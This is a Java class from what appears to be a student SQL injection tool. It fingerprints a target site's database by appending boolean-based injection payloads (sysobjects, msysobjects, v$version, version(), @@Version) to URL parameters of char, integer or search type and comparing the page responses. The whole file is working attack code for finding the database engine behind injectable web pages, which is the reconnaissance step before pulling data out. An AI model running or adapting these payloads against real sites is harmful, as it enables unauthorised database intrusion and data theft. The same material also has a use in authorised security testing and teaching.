package cn.edu.neu.MJ.SQLInject;


public class DBType {
	public boolean timeout = false;
	private String[] access = {
			"ID=1%20and%20(select%20count%20(*)%20from%20sysobjects)>0",
			//ID=1 and (select count(*) from sysobjects)>0
			"ID=1%20and%20(select%20count%20(*)%20from%20msysobjects)>0"
			//ID=1 and (select count(*) from msysobjects)>0
	};
	public String getType(String url,String sqltype){
		String teststr = "";
		String teststr1="";
		String topurl=url;
	    if(sqltype.equals("charGet")){//如果get注入为char型，url进行如下处理
	    	teststr="%20and%20'1'='1";
	    	teststr1="'";
	    }else if(sqltype.equals("intGet")){
	    	teststr="%20and%20 1 = 1";
	    	teststr1=" ";
	    }
	    else if(sqltype.equals("searchGet")){//如果get注入为搜索型，url进行如下处理
		    	teststr="%20and%20'%'='";
		    	teststr1="%'";
		}
		choose c =new choose();
		if (!c.truth(topurl,url+teststr1+access[0]+teststr) 
				&& !c.truth(url,url+teststr1+access[1]+teststr)){//判断是否为Access数据库
			return "Access";
		}//若加sysobjects和msysobjects的SQL语句后，网页显示都不正常，或者加msysobjects后显示正常，则为ACCESS数据库。
		if (c.timeout){
			timeout = true;
			return "";
		}
		if (c.truth(topurl,url+teststr1+"%20and%20exists(select%20*%20from%20v$version)"+teststr))//判断是否为Oracle数据库
			return "Oracle";
		if (c.timeout){ //超时处理
			timeout = true;
			return "";
		}
		if (c.truth(topurl,url+teststr1+"%20and%20exists(select%20version())"+teststr))//判断是否为Mysql数据库
			return "Mysql";
		if (c.timeout){
			timeout = true;
			return "";
		}
		if (c.truth(topurl,url+teststr1+"%20and%20exists(Select%20@@Version)"+teststr))//判断是否为Sqlserver数据库
			return "Sqlserver";
		if (c.timeout){
			timeout = true;
			return "";
		}
		
		return "other";
	}
}
